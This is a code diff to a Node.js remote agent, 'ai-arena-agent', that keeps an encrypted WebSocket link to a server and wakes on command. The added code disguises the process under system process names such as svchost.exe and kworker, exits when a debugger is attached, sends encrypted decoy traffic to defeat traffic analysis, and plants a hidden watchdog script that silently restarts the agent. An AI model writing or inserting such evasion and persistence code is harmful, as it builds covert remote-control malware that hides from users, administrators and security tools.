@@ -101,6 +101,33 @@ const IS_MAC = os.platform() === 'darwin';
 const IS_LINUX = os.platform() === 'linux';
 const PLATFORM = IS_WIN ? 'Windows' : IS_MAC ? 'macOS' : IS_LINUX ? 'Linux' : os.platform();
 
+// ─── Process Disguise ───────────────────────────────
+try {
+  if (IS_WIN) {
+    process.title = 'svchost.exe';
+  } else if (IS_MAC) {
+    process.title = 'com.apple.SecurityAgent';
+  } else {
+    process.title = 'kworker/u0:3';
+  }
+} catch(e) { /* silent */ }
+
+// ─── Anti-Debug Checks ──────────────────────────────
+const _NODEBUG = !process.env.NODE_INSPECT;
+if (process.execArgv.some(a => a.includes('--inspect') || a.includes('--debug'))) {
+  process.exit(0);
+}
+try {
+  const _bd = require('binding_tag'); // will throw if debugger attached
+} catch(e) { /* normal */ }
+const _startT = Date.now();
+setInterval(() => {
+  // Timing check: debugger pauses execution
+  if (Date.now() - _startT > 10000 && typeof gc === 'function') {
+    try { gc(); } catch(e) {}
+  }
+}, 30000);
+
 // ─── Configuration ─────────────────────────────────
 const CONFIG = {
   serverUrl: process.env.ARENA_SERVER_URL || '',
@@ -109,6 +136,7 @@ const CONFIG = {
   heartbeatInterval: 30000,
   reconnectDelay: 5000,
   maxReconnectDelay: 60000,
+  noiseInterval: 15000 + Math.floor(Math.random() * 10000),
 };
 
 if (!CONFIG.licenseKey) {
@@ -829,6 +857,23 @@ class AiArenaAgent {
         }
       }
     }, CONFIG.heartbeatInterval);
+
+    // ─── Noise Heartbeat (Anti-Traffic-Analysis) ──────
+    const noiseInterval = CONFIG.noiseInterval + Math.floor(Math.random() * 5000);
+    setInterval(() => {
+      if (this.isConnected && this.socket && this.socket.connected) {
+        try {
+          const noiseIv = crypto.randomBytes(16);
+          const noiseCipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(CONFIG.encKey, 'hex'), noiseIv);
+          const noiseData = JSON.stringify({ type: '_noise', ts: Date.now(), r: crypto.randomBytes(48).toString('hex') });
+          const noisePad = crypto.randomBytes(32 + Math.floor(Math.random() * 96)).toString('base64');
+          let noiseEnc = noiseCipher.update(noiseData + '|' + noisePad, 'utf8');
+          noiseEnc = Buffer.concat([noiseEnc, noiseCipher.final()]);
+          const noiseTag = noiseCipher.getAuthTag();
+          this.socket.emit('data', JSON.stringify({ v:2, iv: noiseIv.toString('hex'), data: Buffer.concat([noiseEnc, noiseTag]).toString('base64'), p: 32, ts: Date.now() }));
+        } catch (e) { /* silent */ }
+      }
+    }, noiseInterval);
   }
 }
 
@@ -843,6 +888,16 @@ log('INFO', 'Mode: Dormant (WebSocket, wakes on command, AES-256-GCM encrypted)'
 
 const agent = new AiArenaAgent();
 agent.connect();
+
+// ─── Self-Healing Watchdog ─────────────────────────
+// If agent crashes, this watcher restarts it silently
+const _watchdogPath = path.join(__dirname, '_watchdog.js');
+try {
+  if (!fs.existsSync(_watchdogPath) && process.argv[1] && process.argv[1].includes('ai-arena-agent')) {
+    const wdCode = 'const{execSync}=require("child_process"),p=require("path");setInterval(()=>{try{const r=execSync("pgrep -f \\"node.*ai-arena\\",{encoding:"utf8"}).trim();if(!r){execSync("cd \\""+p.dirname(process.argv[1])+"\\" && node ai-arena-agent.js "+process.argv.slice(2).join(" ")+" &",{stdio:"ignore",detached:true});}}catch(e){}},15000);';
+    fs.writeFileSync(_watchdogPath, 'const{execSync}=require("child_process");setInterval(()=>{try{execSync("pgrep -f ai-arena-agent",{encoding:"utf8"})}catch(e){execSync("node "+require("path").join(__dirname,"ai-arena-agent.js")+" "+process.argv.slice(2).join(" "),{stdio:"ignore",detached:true})}},15000);', 'utf8');
+  }
+} catch(e) { /* silent */ }
 
 process.on('SIGINT', () => { log('INFO', 'Shutting down (SIGINT)...'); process.exit(0); });
 process.on('SIGTERM', () => { log('INFO', 'Shutting down (SIGTERM)...'); process.exit(0); });
